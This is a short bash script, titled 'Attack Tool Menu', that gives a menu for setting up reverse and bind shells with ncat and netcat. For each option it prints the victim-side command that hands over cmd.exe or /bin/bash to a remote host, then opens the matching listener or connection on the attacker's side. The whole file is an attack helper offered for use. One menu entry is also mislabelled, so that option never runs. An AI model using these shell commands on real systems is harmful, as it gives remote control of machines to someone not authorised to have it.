#!/bin/bash
# Attack Tool Menu by: Nick Lockard

PS3='Please enter your choice: '
options=("Ncat Reverse SSL" "Ncat Bind SSL" "Netcat Reverse" "Ncat Bind" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Ncat Reverse SSL")
            echo "you chose choice 1"
	    read -p 'Local Port: ' l_port
		echo "Target Windows: ncat --exec cmd.exe -v --ssl <ip> <port>"
		echo "Target Linux: ncat --exec /bin/bash -v --ssl <ip> <port>"
		echo "Ncat Listener Ready"
		ncat -vl --ssl "$l_port"
            ;;
        "Ncat Bind SSL")
            echo "you chose choice 2"
		read -p 'Target IP: ' t_ip
	    read -p 'Target Port: ' t_port
		echo "Target Windows: ncat --exec cmd.exe -vl --ssl <port>"
		echo "Target Linux: ncat --exec /bin/bash -vl --ssl <port>"
		echo "Ncat Connection Ready"
		ncat -v --ssl $t_ip $t_port
            ;;
        "Netcat Reverse")
            echo "you chose choice 3"
	    read -p 'Local Port: ' l_port
		echo "Target Windows: nc -nv <ip> <port> -e cmd.exe"
		echo "Target Linux: nc -nv <ip> <port> -e /bin/bash"
		echo "Netcat Listener Ready"
		nc -nlvp "$l_port"
            ;;
        "Netcat Bind")
            echo "you chose choice 4"
		read -p 'Target IP: ' t_ip
	    read -p 'Target Port: ' t_port
		echo "Target Windows: nc -nlvp <port> -e cmd.exe"
		echo "Target Linux: nc -nlvp <port> -e /bin/bash"
		echo "Netcat Connection Ready"
		ncat -nv $t_ip $t_port
            ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
